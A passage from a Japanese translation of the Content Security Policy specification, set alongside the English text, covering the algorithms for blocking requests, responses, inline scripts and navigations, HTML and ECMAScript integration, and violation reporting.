Let violates be the result of executing §6.6.1.1 Does request violate policy? on request and policy.
</li>
			<li>
~IF［
%違反ed指令 ~NEQ `非違反^i
］
⇒
`新たな違反~obj$A( %要請, %施策, %違反ed指令 )
を用いて，`違反を報告する$A
◎
If violates is not "Does Not Violate", then execute §5.3 Report a violation on the result of executing §2.3.2 Create a violation object for request, policy, and directive on request, policy, and violates.
</li>
		</ol>
	</li>
</ol>


			</section>
			<section id="should-block-request">
<h4 title="Should request be blocked by Content Security Policy?">4.1.3. %要請 は~CSPにより阻止されるべきか？</h4>

<p>
次の~algoは、所与の
( `要請$ %要請 )
に対し，［
`阻止ed^i ／ `許容ed^i
］を返した上で、
%要請 の`~client$rqの~CSPに基づいて違反を報告する：
◎
Given a request (request), this algorithm returns Blocked or Allowed and reports violations based on request’s client’s Content Security Policy.
</p>

<ol>
	<li>
%~CSP~list ~LET
%要請 の`~client$rqの`大域~obj$xの`~CSP~list$
◎
Let CSP list be request’s client’s global object’s CSP list.
</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
~FOR
%~CSP~list 内の ~EACH ( %施策 ) に対し：
◎
For each policy in CSP list:
</p>
		<ol>
			<li>
~IF［
%施策 の`処分先$ ~EQ `report^l
］
⇒
~CONTINUE
◎
If policy’s disposition is "report", then skip to the next policy.
</li>
			<li>
%違反ed指令 ~LET
`要請は施策に違反するか？$A( %要請, %施策 )
◎
Let violates be the result of executing §6.6.1.1 Does request violate policy? on request and policy.
</li>
			<li>
<p>
~IF［
%違反ed指令 ~NEQ `非違反^i
］：
◎
If violates is not "Does Not Violate", then:
</p>
				<ol>
					<li>
`新たな違反~obj$A( %要請, %施策, %違反ed指令 )
を用いて，`違反を報告する$A
◎
Execute §5.3 Report a violation on the result of executing §2.3.2 Create a violation object for request, policy, and directive on request, policy, and violates.
</li>
					<li>
%結果 ~SET `阻止ed^i
◎
Set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~RET %結果
◎
Return result.
</li>
</ol>



			</section>
			<section id="should-block-response">
<h4 title="Should response to request be blocked by Content Security Policy?">4.1.4. %要請 に対する %応答 は~CSPにより阻止されるべきか？</h4>

<p>
次の~algoは、所与の
( `応答$ %応答, `要請$ %要請 )
に対し，［
`阻止ed^i ／ `許容ed^i
］を返した上で、
%要請 の
`~client$rqの~CSPに基づいて違反を報告する：
◎
Given a response (response) and a request (request), this algorithm returns Blocked or Allowed, and reports violations based on request’s client’s Content Security Policy.
</p>

<ol>
	<li>
%~CSP~list ~LET
%要請 の`~client$rqの`大域~obj$xの`~CSP~list$
◎
Let CSP list be request’s client’s global object’s CSP list.
</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
~FOR
%~CSP~list 内の ~EACH ( %施策 ) に対し：
◎
For each policy in CSP list:
</p>
		<ol>
			<li>
<p>
~FOR
%施策 内の ~EACH ( %指令 ) に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
<p>
~IF［
%指令 の`要請後~検査$Aを実行した結果 ~EQ `阻止ed^i
］：
◎
If the result of executing directive’s post-request check is "Blocked", then:
</p>
						<ol>
							<li>
`新たな違反~obj$A( %要請, %施策, %指令 )
を用いて，`違反を報告する$A
◎
Execute §5.3 Report a violation on the result of executing §2.3.2 Create a violation object for request, policy, and directive on request, policy, and directive.
</li>
							<li>
~IF［
%施策 の`処分先$ ~EQ `enforce^l

］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
						</ol>
					</li>
				</ol>
			</li>
		</ol>
<p class="note">注記：
検査のこの部位は、~pageが応答を読込めるかどうかを検証0する。
すなわち， Service Worker が、~pageの~CSPに違反するような~fileに~~置き換えていないかどうかを。
◎
Note: This portion of the check verifies that the page can load the response. That is, that a Service Worker hasn’t substituted a file which would violate the page’s CSP.
</p>
	</li>
	<li>
<p>
~FOR
%応答 の`~CSP~list$ 内の ~EACH ( %施策 ) に対し：
◎
For each policy in response’s CSP list:
</p>
		<ol>
			<li>
<p>
~FOR
%施策 内の ~EACH ( %指令 ) に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
<p>
~IF［
( %要請, %応答, %施策 )
に対し，%指令 の`応答~検査$Aを実行した結果 ~EQ `阻止ed^i
］：
◎
If the result of executing directive’s response check on request, response, and policy is "Blocked", then:
</p>
						<ol>
							<li>
`新たな違反~obj$A( %要請, %施策, %指令 )
を用いて，`違反を報告する$A
◎
Execute §5.3 Report a violation on the result of executing §2.3.2 Create a violation object for request, policy, and directive on request, policy, and directive.
</li>
							<li>
~IF［
%施策 の`処分先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
						</ol>
					</li>
				</ol>
			</li>
		</ol>

<p class="note">注記：
検査のこの部位は、応答に伴って送達されてきた施策が，応答の送達を許容するかどうかを決定できるようにする。
◎
Note: This portion of the check allows policies delivered with the response to determine whether the response is allowed to be delivered.
</p>

	</li>
	<li>
~RET %結果
◎
Return result.
</li>
</ol>

			</section>
		</section>
		<section id="html-integration">
<h3 title="Integration with HTML">4.2. ~HTMLとの統合</h3>

<ol>
	<li>
<p>
各［
`Document$I ／ `WorkerGlobalScope$I
］~objは、
`~CSP~list@
を持つ
—
それは、所与の文脈で作動中の`施策$~objすべてを保持する。
この~listは、指定されない限り空であり，
`大域~objの~CSP~listを初期化する$A
~algoを介して拡充される。
◎
The Document and WorkerGlobalScope objects have a CSP list, which holds all the policy objects which are active for a given context. This list is empty unless otherwise specified, and is populated via the §4.2.2 Initialize a global object’s CSP list algorithm.
</p>

<p class="issue">
この概念は、 W3C 版の Workers にはない（ `187^IssW3C ）。
◎
This concept is missing from W3C’s Workers. &lt;https://github.com/w3c/html/issues/187&gt;
</p>
	</li>
	<li>
`施策$は、`大域~obj$の`~CSP~list$内に挿入されることにより，`大域~obj$に対し［
`施行-@
／
`監視-@
］されることになる。
◎
A policy is enforced or monitored for a global object by inserting it into the global object’s CSP list.
</li>
	<li>
`大域~objの~CSP~listを初期化する$A手続きは、［
`応答$に結付けられた`施策$~objの集合
］を［
新たに作成された`大域~obj$に束縛する
］ために，［
`新たな文書~objを初期化する$ ／
`~workerを走らす$
］~algoの中から~callされる。
◎
§4.2.2 Initialize a global object’s CSP list is called during the initializing a new Document object and run a worker algorithms in order to bind a set of policy objects associated with a response to a newly created global object.
</li>
	<li>
<p >
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$A
は、次の 2 つから~callされる：
</p>
		<ul>
			<li>
`~scriptを準備する$ときに，~inline~script~blockの実行が許容されるかどうかを決定するとき。
</li>
			<li>
`~style~blockを更新する$~algoの中で，~inline~style~blockによる具現化-が許容されるかどうかを決定するとき。
</li>
		</ul>
◎
§4.2.3 Should element’s inline type behavior be blocked by Content Security Policy? is called during the prepare a script and update a style block algorithms in order to determine whether or not an inline script or style block is allowed to execute/render.
</li>
	<li>
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$Aは、［
~inline~event~handler（ `onclick^c など）／
~inline `style^a 属性
］を取扱う間に，［
その［
実行- ／ 具現化-
］が許容されるべきかどうか
］を決定するために~callされる。
◎
§4.2.3 Should element’s inline type behavior be blocked by Content Security Policy? is called during handling of inline event handlers (like onclick) and inline style attributes in order to determine whether or not they ought to be allowed to execute/render.
</li>
	<li>
各`施策$は、 `meta$e 要素の `http-equiv$a 属性を処理する間に`施行され$る。
◎
Policy is enforced during processing of the meta element’s http-equiv.
</li>
	<li>
所与の`文書$ %C に対し，次を満たす`文書$ %D が存在するならば、
%D を指して %C を
`埋込んでいる文書@
という
⇒
%D が`属する閲覧文脈$は， %C が`属する閲覧文脈$を %D を`通して入子に$している
◎
A Document's embedding document is the Document through which the Document's browsing context is nested.
</li>
	<li>
<p>
HTML は、資源の読込みに責を負う要素からの 関連する~dataで，各`要請$の［
`暗号用~nonce~metadata$rq,
`構文解析器~metadata$rq
］を拡充する。
◎
HTML populates each request’s cryptographic nonce metadata and parser metadata with relevant data from the elements responsible for resource loading.
</p>

<p class="issue">
~stylesheetの読込みは、まだ
W3C 版~HTMLにおける~Fetchには統合されていない（
<a href="https://github.com/whatwg/html/issues/198">&lt;https://github.com/whatwg/html/issues/198&gt;</a>
）
◎
Stylesheet loading is not yet integrated with Fetch in W3C’s HTML. &lt;https://github.com/whatwg/html/issues/198&gt;
</p>

<p class="issue">
~stylesheetの読込みは、まだ
WHATWG 版~HTMLにおける~Fetchには統合されていない（
<a href="https://github.com/whatwg/html/issues/968">&lt;https://github.com/whatwg/html/issues/968&gt;</a>
）
◎
Stylesheet loading is not yet integrated with Fetch in WHATWG’s HTML. &lt;https://github.com/whatwg/html/issues/968&gt;
</p>
	</li>
	<li>
<a href="#allow-base-for-document">%文書 に対する %基底 は許容されるか？</a> は、
`href$a 属性の値が妥当になることを確保するため，
`base$e の`凍結済み基底~URLを設定する$間に~callされる
◎
§6.2.1.1 Is base allowed for document? is called during base's set the frozen base URL algorithm to ensure that the href attribute’s value is valid.
</li>

	<li>
<p>
<a href="#should-plugin-element-be-blocked-a-priori-by-content-security-policy">%~plugin要素 は~CSPにより先天的に阻止されるべきか？</a>
は、
`object$e ／ `embed$e ／ `applet$e
要素の処理に際し，それが ~fetchを誘発してよいかどうかを決定する間に~callされる
◎
§6.2.2.2 Should plugin element be blocked a priori by Content Security Policy?: is called during the processing of object, embed, and applet elements to determine whether they may trigger a fetch.
</p>

<p class="note">注記：
~fetchされた~plugin資源は、
`要請に対する応答は~CSPにより阻止されるべきか？$A
にて取扱われる。
◎
Note: Fetched plugin resources are handled in §4.1.4 Should response to request be blocked by Content Security Policy?.
</p>

<p class="issue">
この~hookは W3C 版~HTMLにはまだない。
`547^IssW3C
◎
This hook is missing from W3C’s HTML. &lt;https://github.com/w3c/html/issues/547&gt;
</p>
	</li>
	<li>
<p>
<a href="#should-block-navigation-request">( %~navi要請 of %種別 from %~source in %~target ) は，~CSPにより阻止されるべきか？</a>
は、`~navigate~fetchを処理する$A間に~callされる。
<a href="#should-block-navigation-response">( %~navi要請 of %種別 from %~source in %~target ) に対する %~navi応答 は ~CSPにより阻止されるべきか？</a>
は、`~navigate応答を処理する$A間に~callされる。
いずれも，指令の~navi検査を適用する。
◎
§4.2.4 Should navigation request of type from source in target be blocked by Content Security Policy? is called during the process a navigate fetch algorithm, and §4.2.5 Should navigation response to navigation request of type from source in target be blocked by Content Security Policy? is called during the process a navigate response algorithm to apply directive’s navigation checks.
</p>

<p class="issue">
W3C 版~HTMLは ~Fetchに基づいておらず，`~navigate応答を処理する$A~algoを~hookする場がない。
`548^IssW3C
◎
W3C’s HTML is not based on Fetch, and does not have a process a navigate response algorithm into which to hook. &lt;https://github.com/w3c/html/issues/548&gt;
</p>
	</li>
</ol>



			<section id="initialize-document-csp">
<h4 title="Initialize a Document's CSP list">4.2.1. 文書の~CSP~listを初期化する</h4>

<p>
この手続きは、
( `文書$ %文書, `応答$ %応答 )
が与えられた下で，
%文書 の`~CSP~list$docを初期化する：
◎
Given a Document (document), and a response (response), the user agent performs the following steps in order to initialize document’s CSP list:
</p>

<ol>
	<li>
<p>
~IF［
%応答 の`~url$rsの`~scheme$uは `局所~scheme$uである
］：
◎
If response’s url’s scheme is a local scheme:
</p>
		<ol>
			<li>
`文書たち^v ~LET 空~list
◎
Let documents be an empty list.
</li>
			<li>
~IF［
%文書 を`埋込んでいる文書$ %D はある
］
⇒
%D を `文書たち^v に追加する
◎
If document has an embedding document (embedding), then add embedding to documents.
</li>
			<li>
~IF［
%文書 を`開いた閲覧文脈$ %B はある
］
⇒
%B にて`作動中の文書$を `文書たち^v に追加する
◎
If document has an opener browsing context, then add its active document to documents.
</li>
			<li>
<p>
~FOR
`文書たち^v 内の ~EACH ( %D ) に対し：
◎
For each doc in documents:
</p>
				<ol>
					<li>
<p>
~FOR
%D の`~CSP~list$doc内の ~EACH ( %施策 ) に対し：
◎
For each policy in doc’s CSP list:
</p>
						<ol>
							<li>
%施策 への~aliasを，%文書 の`~CSP~list$docの中に挿入する
◎
Insert an alias to policy in document’s CSP list.
</li>
					</ol>
				</li>
			</ol>
		</li>
	</ol>

<p class="note">注記：
`局所~scheme$uには `about^sc も含まれる。
したがってこの~algoは、
`~iframe-srcdoc文書$を`埋込んでいる文書$の施策を~aliasする。
◎
Note: local scheme includes about:, and this algorithm will therefore alias the embedding document’s policies for an iframe srcdoc Document.
</p>

<p class="note">注記：
この段は、［
~pageにて［
~frameを埋込む ／ 新たな~windowを~pop-upする
］ことにより，それが制御する内容（
`blob^sc 資源や, `document.write()^c
）が~pageの`施策$を迂回すること
］は、できないようにすることを確保する。
◎
Note: We do all this to ensure that a page cannot bypass its policy by embedding a frame or popping up a new window containing content it controls (blob: resources, or document.write()).
</p>
	</li>
	<li>
~FOR
%応答 の`~CSP~list$rs内の ~EACH ( %施策 ) に対し
⇒
%施策 を %文書 の`~CSP~list$docの中に挿入する
◎
For each policy in response’s CSP list, insert policy into document’s CSP list.
</li>
	<li>
~FOR
%文書 の`~CSP~list$内の ~EACH ( %施策 ) に対し
⇒
~FOR
%施策 内の ~EACH ( %指令 ) に対し
⇒
( %文書, %応答 )
に対し， %指令 の`初期化$A~algoを実行する
◎
For each policy in document’s CSP list:
• For each directive in policy:
•• Execute directive’s initialization algorithm on document and response.
</li>

</ol>

			</section>
			<section id="initialize-global-object-csp">
<h4 title="Initialize a global object’s CSP list">4.2.2. 大域~objの~CSP~listを初期化する</h4>

<p>
この手続きは、
( `応答$ %応答, `大域~obj$ %大域~obj )
が与えられた下で，
%大域~obj の`~CSP~list$を初期化する：
◎
Given a global object (global), and a response (response), the user agent performs the following steps in order to initialize global’s CSP list:
</p>

<ol>
	<li>
<p>
~IF［
%応答 の`~url$rsの`~scheme$uは `局所~scheme$uである
］：
◎
If response’s url’s scheme is a local scheme:
</p>
		<ol>
			<li>
`文書たち^v ~LET 空~list
◎
Let documents be an empty list.
</li>
			<li>
~FOR
%大域~obj の~EACH ( `文書$x %文書 ) に対し
⇒
%文書 を `文書たち^v に追加する
◎
Add each of global’s documents to documents.
</li>
			<li>
<p>
~FOR
`文書たち^v 内の ~EACH ( %文書 ) に対し：
◎
For each document in documents:
</p>
				<ol>
					<li>
<p>
~FOR
%文書 の`大域~obj$の`~CSP~list$内の ~EACH ( %施策 ) に対し：
◎
For each policy in document’s global object’s CSP list:
</p>
						<ol>
							<li>
%施策 への~aliasを，
%大域~obj の`~CSP~list$の中に挿入する
◎
Insert an alias to policy in global’s CSP list.
</li>
						</ol>
					</li>
				</ol>
			</li>
		</ol>

<p class="note">注記：
`局所~scheme$uには `about^sc も含まれる。
— したがってこの~algoは、`~iframe-srcdoc文書$を`埋込んでいる文書$の施策を~aliasする。
◎
Note: local scheme includes about:, and this algorithm will therefore alias the embedding document’s policies for an iframe srcdoc Document.
</p>
	</li>
	<li>
~FOR
%応答 の`~CSP~list$rs内の ~EACH ( %施策 ) に対し
⇒
%施策 を %大域~obj の`~CSP~list$の中に挿入する
◎
For each policy in response’s CSP list, insert policy into global’s CSP list.
</li>
</ol>



			</section>
			<section id="should-block-inline">
<h4 title="Should element’s inline type behavior be blocked by Content Security Policy?">4.2.3. %要素 における~inline型の挙動は~CSPにより阻止されるべきか？</h4>

<p>
この~algoは、所与の
( `要素$ %要素, 文字列 %型, 文字列 %~source )
に対し，
%要素 における［
~inline定義による特定0の型の挙動（
~script実行, ~styleの適用, ~event~handler,
等々）
］が［
許容されるならば `許容ed^i ／
許容されないならば `阻止ed^i
］を返す：
◎
Given an Element (element), a string (type), and a string (source) this algorithm returns "Allowed" if the element is allowed to have inline definition of a particular type of behavior (script execution, style application, event handlers, etc.), and "Blocked" otherwise:
</p>



<ol>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
~FOR
%要素 の`文書$の`大域~obj$の`~CSP~list$
内の ~EACH ( %施策 ) に対し：
◎
For each policy in element’s Document's global object’s CSP list:
</p>
		<ol>
			<li>
<p>
~FOR
%施策 内の ~EACH ( %指令 ) に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
~IF［
( %要素, %型, %~source )
に対し，%指令 の`~inline検査$Aを実行した結果 ~EQ `許容ed^i 
］
⇒
~CONTINUE
◎
If directive’s inline check returns "Allowed" when executed upon element, type, and source, skip to the next directive.
</li>
					<li>
%指令~名 ~LET ［
%型 ~IN { `style^l, `style-attribute^l } ならば `style-src^l ／
~ELSE_ `script-src^l
］
◎
↓</li>
					<li>
%違反 ~LET `新たな違反~obj$A1(
`現在の設定群~obj$の`大域~obj$x, %施策, %指令~名
)
◎
Otherwise, let violation be the result of executing §2.3.1 Create a violation object for global, policy, and directive on the current settings object’s global object, policy, and "style-src" if type is "style" or "style-attribute", or "script-src" otherwise.
</li>
					<li>
%違反 の`資源$vr ~SET `inline^l
◎
Set violation’s resource to "inline".
</li>
					<li>
%違反 の`要素$vr ~SET %要素
◎
Set violation’s element to element.
</li>
					<li>
%違反 を用いて，`違反を報告する$A
◎
Execute §5.3 Report a violation on violation.
</li>
					<li>
~IF［
%施策 の`処分先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~RET %結果
◎
Return result.
</li>
</ol>


			</section>
			<section id="should-block-navigation-request">
<h4 title="Should navigation request of type from source in target be blocked by Content Security Policy?">4.2.4. ( %~navi要請 of %種別 from %~source in %~target ) は ~CSPにより阻止されるべきか？</h4>


<p>
この~algoは、所与の (
`要請$ %~navi要請,
文字列 %種別,
`閲覧文脈$ %~source,
`閲覧文脈$ %~target
)
に対し，［
作動中の施策が~naviを阻止するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (navigation request), a string (type, either "form-submission" or "other"), and two browsing contexts (source and target), this algorithm return "Blocked" if the active policy blocks the navigation, and "Allowed" otherwise:
</p>

<ol>
	<li>
~Assert：
%種別 ~IN { `form-submission^l, `other^l }
◎
↑</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
~FOR
%~source にて`作動中の文書$の`~CSP~list$rs内の~EACH( %施策 ) に対し：
◎
For each policy in source’s active document’s CSP list:
</p>

		<ol>
			<li>
<p>
~FOR
%施策 内の~EACH( %指令 ) に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
~IF［
%指令 の`~navi前~検査$A( %~navi要請, %種別, %~source, %~target )
~EQ `許容ed^i
］
⇒
~CONTINUE
◎
If directive’s pre-navigation check returns "Allowed" when executed upon navigation request, type, source, and target, skip to the next directive.
</li>
					<li>
%違反 ~LET `新たな違反~obj$A1(
%~source に`関連する大域~obj$【？】, %施策, %指令 の`名前$
)
◎
Otherwise, let violation be the result of executing §2.3.1 Create a violation object for global, policy, and directive on source’s relevant global object, policy, and directive’s name.
</li>
					<li>
%違反 の`資源$vr ~SET %~navi要請 の`~url$rs
◎
Set violation’s resource to navigation request’s URL.
</li>
					<li>
%違反 を用いて，`違反を報告する$A
◎
Execute §5.3 Report a violation on violation.
</li>
					<li>
~IF［
%施策 の`処分先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>

	<li>
~RET %結果
◎
Return result.
</li>
</ol>


			</section>
			<section id="should-block-navigation-response">
<h4 title="Should navigation response to navigation request of type from source in target be blocked by Content Security Policy?">4.2.5. ( %~navi要請 of %種別 from %~source in %~target ) に対する %~navi応答 は ~CSPにより阻止されるべきか？</h4>


<p>
この~algoは、所与の (
`要請$ %~navi要請,
文字列 %種別,
`応答$ %~navi応答,
`閲覧文脈$ %~source,
`閲覧文脈$ %~target
) に対し，［
作動中の施策が~naviを阻止するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (navigation request),, a string (type, either "form-submission" or "other"), a response navigation response, and two browsing contexts (source and target), this algorithm returns "Blocked" if the active policy blocks the navigation, and "Allowed" otherwise:
</p>

<ol>
	<li>
~Assert：
%種別 ~IN { `form-submission^l, `other^l }
◎
↑</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
~FOR
%~navi応答 の`~CSP~list$rs内の ~EACH( %施策 ) に対し：
◎
For each policy in navigation response’s CSP list:
</p>
		<ol>
			<li>
<p>
~FOR
%施策 内の~EACH( %指令 ) に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
~IF［
%指令 の`~navi応答~検査$A( %~navi要請, %種別, %~navi応答, %~source, %~target )
~EQ `許容ed^i
］
⇒
~CONTINUE
◎
If directive’s navigation response check returns "Allowed" when executed upon navigation request, type, navigation response, source, and target, skip to the next directive.
</li>
					<li>
<p>
%違反 ~LET `新たな違反~obj$A1(
~NULL, %施策, %指令 の`名前$
)
◎
Otherwise, let violation be the result of executing §2.3.1 Create a violation object for global, policy, and directive on null, policy, and directive’s name.
</p>

<p class="note">注記：
大域~objは存在しないので、大域~objとして ~NULL を利用する
— ~naviは、 `Document^I が作成される所までは まだ処理されていない。
◎
Note: We use null for the global object, as no global exists: we haven’t processed the navigation to create a Document yet.
</p>
					</li>
					<li>
%違反 の`資源$vr ~SET %~navi応答 の`~url$rs
◎
Set violation’s resource to navigation response’s URL.
</li>

					<li>
%違反 を用いて，`違反を報告する$A
◎
Execute §5.3 Report a violation on violation.
</li>

					<li>
~IF［
%施策 の`処分先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>

	<li>
~RET %結果
◎
Return result.
</li>
</ol>
			</section>
		</section>
		<section id="ecma-integration">
<h3 title="Integration with ECMAScript">4.3. ECMAScript との統合</h3>


<p>
ECMAScript では、~host環境が 文字列から ECMAScript ~codeへの~compilationを阻止できるようにする
`HostEnsureCanCompileStrings$AO()
抽象演算が定義されている。
この文書は、その抽象演算の実装を定義する
— それは、関連する`~CSP~list$を調べて，そのような~compilationは阻止されるべきかどうか決定する。
◎
ECMAScript defines a HostEnsureCanCompileStrings() abstract operation which allows the host environment to block the compilation of strings into ECMAScript code. This document defines an implementation of that abstract operation thich examines the relevant CSP list to determine whether such compilation ought to be blocked.
</p>



			<section id="can-compile-strings">
<h4>4.3.1. `EnsureCSPDoesNotBlockStringCompilation^AO(%callerRealm, %calleeRealm)</h4>

<p>
この~algoは、所与の 2 つの`~realm$
( %callerRealm, %calleeRealm )
に対し，文字列の~compilationが許容されないならば `EvalError^E を投出し，他の場合は何もしない：
◎
Given two realms (callerRealm and calleeRealm), this algorithm returns normally if string compilation is allowed, and throws an "EvalError" if not:
</p>

<ol>
	<li>
%大域~obj~list ~LET ［
%callerRealm の大域~obj, %calleeRealm の大域~obj
］からなる~list
<!-- ＊大域~obj$realm？ -->
◎
Let globals be a list containing callerRealm’s global object and calleeRealm’s global object.
</li>
	<li>
<p>
~FOR
%大域~obj~list 内の ~EACH ( %大域~obj ) に対し：
◎
For each global in globals:
</p>
		<ol>
			<li>
<p>
~FOR
%大域~obj の`~CSP~list$内の ~EACH ( %施策 ) に対し：
◎
For each policy in global’s CSP list:
</p>
				<ol>
					<li>
%~source~list ~LET ~NULL
◎
Let source-list be null.
</li>
					<li>
~IF［
%施策 内に［
`名前$ ~EQ `script-src^l
］なる`指令$はある
］
⇒
%~source~list ~SET その`指令$の`値$
◎
If policy contains a directive whose name is "script-src", then set source-list to that directive’s value.
</li>
					<li>
~ELIF［
%施策 内に［
`名前$ ~EQ `default-src^l
］なる`指令$はある
］
⇒
%~source~list ~SET その`指令$の`値$
◎
Otherwise if policy contains a directive whose name is "default-src", then set source-list to that directive’s value.
</li>
					<li>
~IF［
%~source~list ~NEQ ~NULL
］~AND［
%~source~list は［
`~source式$ ~EQ~ACI `unsafe-eval$pl
］を包含しない
］
⇒
~THROW `EvalError^E
◎
If source-list is non-null, and does not contain a source expression which is an ASCII case-insensitive match for the string "'unsafe-eval'", then throw an EvalError exception.
</li>
				</ol>
			</li>
		</ol>
	</li>
</ol>

			</section>
		</section>
	</section>
	<section id="reporting">
<h2 title="Reporting">5. 報告処理</h2>

<p>
一つ以上の`施策$の指令が違反されたときは、
`違反~報告@
が生成され，［
`施策$に結付けられている`報告先$（ reporting endpoint ）
］に向けて送信されてよい。
◎
When one or more of a policy’s directives is violated, a violation report may be generated and sent out to a reporting endpoint associated with the policy.
</p>



		<section id="violation-events">
<h3 title="Violation DOM Events">5.1. 違反 DOM ~event</h3>

<pre class="idl">
enum `SecurityPolicyViolationEventDisposition@I {
  `enforce@l, `report@l
};

[`Constructor@m(
  DOMString %type,
  optional `SecurityPolicyViolationEventInit$I %eventInitDict
)]
interface `SecurityPolicyViolationEvent@I : `Event$I {
    readonly    attribute DOMString      `documentURI@m;
    readonly    attribute DOMString      `referrer@m;
    readonly    attribute DOMString      `blockedURI@m;
    readonly    attribute DOMString      `violatedDirective@m;
    readonly    attribute DOMString      `effectiveDirective@m;
    readonly    attribute DOMString      `originalPolicy@m;
    readonly    attribute DOMString      `sourceFile@m;
    readonly    attribute `SecurityPolicyViolationEventDisposition$I      `disposition@m;
    readonly    attribute unsigned short `statusCode@m;
    readonly    attribute long           `lineNumber@m;
    readonly    attribute long           `columnNumber@m;
};

dictionary `SecurityPolicyViolationEventInit@I : `EventInit$I {
    DOMString      `documentURI@d;
    DOMString      `referrer@d;
    DOMString      `blockedURI@d;
    DOMString      `violatedDirective@d;
    DOMString      `effectiveDirective@d;
    DOMString      `originalPolicy@d;
    DOMString      `sourceFile@d;
    `SecurityPolicyViolationEventDisposition$I      `disposition@d;
    unsigned short `statusCode@d;
    long           `lineNumber@d;
    long           `columnNumber@d;
};
</pre>


		</section>
		<section id="deprecated-serialize-violation">
<h3 title="Obtain the deprecated serialization of violation">5.2. %違反 の直列化を得る（非推奨）</h3>

<p>
次の~algoは、所与の
( `違反$ %違反 )
に対し，%違反 を表現する JSON ~text文字列を［［
非推奨にされた `report-uri$dir 指令
］に結付けられている`報告先$への提出に相応しい形
］にして返す。
◎
Given a violation (violation), this algorithm returns a JSON text string representation of the violation, suitable for submission to a reporting endpoint associated with the deprecated report-uri directive.
</p>

<ol>
	<li>
<p>
%~obj ~LET
各種~propが次のように初期化された，新たな~JS ~obj
◎
Let object be a new JavaScript object with properties initialized as follows:
</p>
		<ul>
			<li>
`document-uri^l ~SET ［
%素片除外~flag ~SET ~ON
］の下で，
%違反 の`~url$vrを`~URL直列化器$uにかけた結果
◎
"document-uri"
• The result of executing the URL serializer on violation’s url, with the exclude fragment flag set.
</li>
			<li>
`referrer^l ~SET ［
%素片除外~flag ~SET ~ON
］の下で，
%違反 の`~referrer$vrを`~URL直列化器$uにかけた結果
◎
"referrer"
• The result of executing the URL serializer on violation’s referrer, with the exclude fragment flag set.
</li>
			<li>
`blocked-uri^l ~SET ［
%素片除外~flag ~SET ~ON
］の下で，
%違反 の`資源$vrを`~URL直列化器$uにかけた結果
◎
"blocked-uri"
• The result of executing the URL serializer on violation’s resource, with the exclude fragment flag set.
</li>
			<li>
`effective-directive^l ~SET 
%違反 の`有効な指令$vr
◎
"effective-directive"
• violation’s effective directive
</li>
			<li>
`violated-directive^l ~SET
%違反 の`有効な指令$vr
◎
"violated-directive"
• violation’s effective directive
</li>
			<li>
`original-policy^l ~SET
%違反 の`施策$vrを`直列化-$した結果
◎
"original-policy"
• The serialization of violation’s policy
</li>
			<li>
`disposition^l ~SET %違反 の`施策$vrの`処分先$
◎
"disposition"
• The disposition of violation’s policy
</li>
			<li>
`status-code^l ~SET
%違反 の`状態code$vr
◎
"status-code"
• violation’s status
</li>
		</ul>
	</li>
	<li>
<p>
~IF［
%違反 の`~source~file$vr ~NEQ ~NULL
］
⇒
%~obj の各種~propを次のように設定する：
◎
If violation’s source file is not null:
</p>
		<ul>
			<li>
`source-file^l ~SET［
［
%素片除外~flag ~SET ~ON
］の下で，
%違反 の`~source~file$vrを`~URL直列化器$uにかけた結果
］
◎
Set object’s "source-file" property to the result of executing the URL serializer on violation’s source file, with the exclude fragment flag set.
</li>
			<li>
`line-number^l ~SET %違反 の`行番号$vr
◎
Set object’s "line-number" property to violation’s line number.
</li>
			<li>
`column-number^l ~SET %違反 の`列番号$vr
◎
Set object’s "column-number" property to violation’s column number.
</li>
		</ul>
	</li>
	<li>
~RET
［
%~obj に対し
`JSON.stringify()$c
を実行した結果
］
◎
Return the result of executing JSON.stringify() on object.
</li>
</ol>



		</section>
		<section id="report-violation">
<h3 title="Report a violation">5.3. %違反 を報告する</h3>

<p>
次の~algoは、所与の
( `違反$ %違反 )
に対し，それを［
%違反 の`施策$vrに指定されている`報告先$
］へ報告するとともに，
%違反 の`大域~obj$vrに向けて
`securitypolicyviolation@et
~eventを発火する。
◎
Given a violation (violation), this algorithm reports it to the endpoint specified in violation’s policy, and fires a SecurityPolicyViolationEvent at violation’s global object.
</p>

<ol>
	<li>
%大域~obj ~LET %違反 の`大域~obj$vr
◎
Let global be violation’s global object.
</li>
	<li>
%~target ~LET %違反 の`要素$vr
◎
Let target be violation’s element .
</li>
	<li>
<p>
次の手続きを走らす`~taskを待入する$：
◎
Queue a task to run the following steps:
</p>

<p class="note">注記：
ここで “~taskを待入する” のは、~eventを~targetして配送するのが，［
~JSが所与の違反を担当する~taskの実行（それは DOM を操作し得る）を完了した後
］になることを確保するためである。
◎
Note: We "queue a task" here to ensure that the event targeting and dispatch happens after JavaScript completes execution of the task responsible for a given violation (which might manipulate the DOM).
</p>

